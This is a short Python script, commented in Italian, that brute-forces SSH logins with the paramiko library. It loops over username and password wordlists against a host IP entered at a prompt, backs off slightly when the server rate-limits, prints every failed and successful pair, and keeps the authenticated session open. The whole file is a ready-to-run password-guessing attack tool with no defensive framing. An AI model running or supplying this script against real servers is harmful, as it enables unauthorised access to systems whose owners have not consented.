import time
from paramiko import SSHClient, AutoAddPolicy, AuthenticationException, SSHException

def main(host, user_list, pwd_list):
    """
    Tento la connessione scorrendo le liste.
    Ritorna il client connesso, l'utente e la password se ha successo.
    Ritorna None, None, None se fallisce.
    """
    ssh_client = SSHClient()
    ssh_client.set_missing_host_key_policy(AutoAddPolicy())

    for user in user_list:
        user = user.strip() # strip()per pulire anche gli spazi iniziali
        
        for pwd in pwd_list:
            pwd = pwd.strip()
            
            try:
                # Tento la connessione
                ssh_client.connect(host, port=22, username=user, password=pwd, banner_timeout=300)
                
                # SE ARRIVO QUI, LA PASSWORD È GIUSTA
                print(f"\n SUCCESSO: Username - {user} e Password - {pwd} trovate.")
                print("loggato con:", user, " - ", pwd)
                
                # Ritorno il client attivo per usarlo fuori dalla funzione
                return ssh_client, user, pwd
                
            except AuthenticationException:
                print(f"Fallito: con Username - {user} | Password - {pwd}")
            except SSHException:
                print("**** Rate limiting on server - Waiting ****")
                time.sleep(0.1) # Aumento il tempo di attesa se c'è rate limit
            except Exception as e:
                print(f"Errore generico: {e}")

            # pausa tra un tentativo e l'altro
            time.sleep(0.1)
    
    return None, None, None

# --- CARICAMENTO DATI E AVVIO ---

# Carico i file
try:
    with open('nomi_utenti.txt', 'r') as f:
        user_list = f.readlines()
    with open('password.txt', 'r') as f:
        pwd_list = f.readlines()
except FileNotFoundError:
    print("Errore: Assicurati che i file 'nomi_utenti.txt' e 'password.txt' esistano.")
    exit()

host = input("inserire l'indirizzo IP dell'host: ")

# Chiamo la funzione
client, user_trovato, pwd_trovata = main(host, user_list, pwd_list)

# --- GESTIONE DEL POST-LOGIN ---

if client:
    print("--------------------------------------------------")
    print(f"Connessione stabilita con {user_trovato}!")
    print("La connessione è aperta.")

    # Questo input serve a impedire che lo script finisca e chiuda la connessione
    input("\nPremi INVIO per chiudere la connessione e terminare lo script...")
    client.close()
    print("Connessione chiusa.")
else:
    print("\nNessuna combinazione valida trovata.")
